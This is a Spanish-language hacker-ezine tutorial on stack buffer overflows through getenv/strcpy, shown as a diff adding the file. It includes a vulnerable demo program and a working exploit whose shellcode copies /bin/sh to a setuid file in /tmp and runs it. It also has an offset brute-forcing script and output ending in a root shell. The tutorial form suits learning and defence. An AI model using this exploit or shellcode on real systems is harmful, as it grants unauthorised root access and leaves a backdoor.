@@ -1,0 +1,196 @@
+=============================================================================
+--------------------------------------------------------------------------12-
+-----( Buffer Overflows )----------------------------------------------RM-11]
+-----[ dr_fdisk^ ]-------------------------------[dr_fdisk@raza-mexicana.org]
+
+
+                      BUFFER OVERFLOWS by dr_fdisk^
+                     ------------------------------
+
+
+- Introduccion: 
+En este articulo tratare de explicar de la manera mas facil y comprensible
+los overflows en dos funciones en particular. Proximamente en el siguiente
+articulo que escribire hablare de format bugs, con los cuales puedes
+jugar mucho :-)
+
+- Funciones en C peligrosas: getenv/setenv
+La utilizacion del getenv, setenv son muy peligrosas, tomemos un EJ:
+
+Lean este pedazo de un codigo: 
+
+int main() {
+  char buffer[1024];
+  if (getenv("PROG-DATA") == NULL) {
+    exit(1);
+  }
+  strcpy(buffer, (char *)getenv("PROG-DATA"));
+}
+
+Tenemos los siguientes datos: el BUFFER maxico que es 1024 chars y vemos
+la funcion peligrosa o erronea como prefieran llamarla uds :
+strcpy(buffer, (char *)getenv("PROG-DATA")); 
+
+Bueno ya sabemos que el buffer es de 1024,, pero que pasaria si nosotros
+sobrepasamos la cadena del buffer podriamos probar con 1025 que es la
+que le sigue al maximo. 
+Ahora solo seguimos estos pasos: 
+
+Fase 1
+------
+Exportamos un rango de caracteres mayor al buffer (en este caso 1025)
+
+export PROG-DATA=`perl -e '{print "F"x"1025"}'`
+
+Fase 2
+------
+Corremos el programa bugueado
+
+(root@server01:/prueba/exploits/buff#) ./progdat
+Segmentation fault (core dumped)
+
+Cool nos creo un core
+
+Fase 3
+------
+Una vez creado el core analizamos el problema utilizando gdb
+
+(root@server01:/prueba/exploits/buff#) gdb -c core /prueba/exploits/buff/progdat
+(gdb) info register esp
+esp            0xbffff610       -107374246
+(gdb) quit
+
+Bueno ya tenemos la direccion de retorno que es 0xbffff610 (RET) y la
+logintud que es 1026.
+
+Fase 4
+------
+Buscando la direccion de memoria de retorno del overflow.
+Hacemos el shellcode, yo utilice el execve-shell de teso, el cual esta
+incluido en la ezine (tools/execve-shell.tar.gz).
+
+/*************************** CORTAR DE AQUI ******************************
+
+/* SE PUEDE SETEAR EL OFFSET EJECUTANDOLO ./exploit [offset] */
+
+#include <stdio.h>
+
+char shellcode[] =
+"\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07"
+"\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b"
+"\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff"
+"\xff\xff\x01\x63\x70\x20\x2f\x62\x69\x6e\x2f\x73"
+"\x68\x20\x2f\x74\x6d\x70\x2f\x64\x61\x6d\x65\x72"
+"\x6f\x6f\x74\x3b\x63\x68\x6d\x6f\x64\x20\x30\x30"
+"\x30\x34\x35\x35\x35\x20\x2f\x74\x6d\x70\x2f\x64"
+"\x61\x6d\x65\x72\x6f\x6f\x74\x3b\x2f\x74\x6d\x70"
+"\x2f\x64\x61\x6d\x65\x72\x6f\x6f\x74\x01";
+
+
+#define RET     0xbffff610
+#define NOP     0x90
+#define LEN     1030
+
+void main(int argc, char *argv[]) {
+    char buffer[LEN];
+    long retaddr, offset;
+    int i;
+    offset = 0;
+    if (argc > 1) {
+        offset = atol(argv[1]);
+    }
+    retaddr = RET + offset;
+    printf("Usando Direccion de Retorno: 0x%lx\n\n", retaddr);
+    for (i = 0; i < LEN; i += 4)
+        *(long *) &buffer[i] = retaddr;
+    for (i = 0; i < (LEN - strlen(shellcode) - 100); ++i)
+        *(buffer + i) = NOP;
+    memcpy(buffer + i, shellcode, strlen(shellcode));
+    setenv("PROG-DATA", buffer, 1);
+    execl("/prueba/exploits/buff/progdat", "progdat", 0);
+    return 0;
+}
+
+*************************** HASTA AQUI ******************************/
+
+
+
+
+/*************************** CORTAR DE AQUI ******************************
+
+#!/bin/bash
+if [ "$4" = "" ]; then
+        clear
+        echo " "
+echo "    ÚÚÚÚÚÚÚÚÚÚÚÚÚÚÚÚÚÚÚÚÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿"
+echo "    ³³³³³³³³³³³³³³³³³³³³³ OFFSET BRUTER ³³³³³³³³³³³³³³³³³³³³³³"
+echo "    ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙÙ"
+echo "    dr_fdisk^ (dr_fdisk@raza-mexicana.org) RaZa MeXicAna TEAM "
+echo
+echo " Uso: $0 [exploit] [offset-primero] [offset-final] [resaltos]"
+echo " Ej: $0 /tmp/cronbug 4000 5000 3 "
+echo
+
+exit 1
+fi
+OFFSETPRIMERO=$2
+saltos=$4
+
+until [ "$OFFSETPRIMERO" -gt "$3" ]; do
+      $1 $OFFSETPRIMERO
+     echo
+     echo "--------------------------------------------"
+     echo "Exploit: $1"
+     echo "Usando offset : $OFFSETPRIMERO"
+     echo "--------------------------------------------"
+     echo
+     OFFSETPRIMERO=$[$OFFSETPRIMERO+$saltos]
+done
+
+*************************** HASTA AQUI ******************************/
+
+Ahora compilas el pre-exploit 
+(root@server01:/prueba/exploits/buff#) gcc prueba.c
+
+Ahora hacemos fuerza bruta de offsets hasta encontrar la direccion
+correcta. Por ej en este caso probe desde el -9999 hasta el 9999 con
+resaltos de 100 en 100.
+(root@server01:/prueba/exploits/buff#) ./brute-over ./a.out -9999 9999 100
+
+Cuando encontramos la direccion de retorno correcta luego de hacer el
+brute force de offsets deberemos modificar el exploit y poner la direccion
+de retorno correcta:
+
+
+--------------------------------------------
+Exploit: ./a.out
+Usando offset : 4053
+--------------------------------------------
+
+Usando Direccion de Retorno: 0xc00006a6
+                     I
+1U
+Ø@I
+èÜÿÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8
+óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿8óÿ¿X÷ÿ¿
+
+bash#
+
+Esta direccion es la correcta solo debemos reemplazar en el exploit de
+prueba la direccion 0xbffff610 por la 0xc00006a6.
+y Guala!!! ya tenemos hecho el exploit...
+
+-Despedida:
+Espero que les haya gustado y sobre todo servido, como siempre digo si
+tienen algo que agregar, corregir, o preguntar solo mandenme un email y si
+puedo responder a lo que preguntan con gusto lo hare.
+
+
+################################# THE END
+                                 #####################################
+made by dr_fdisk^
+dr_fdisk@raza-mexicana.org
+http://www.dr-fdisk.raza-mexicana.org/
+
+######################################################################
+
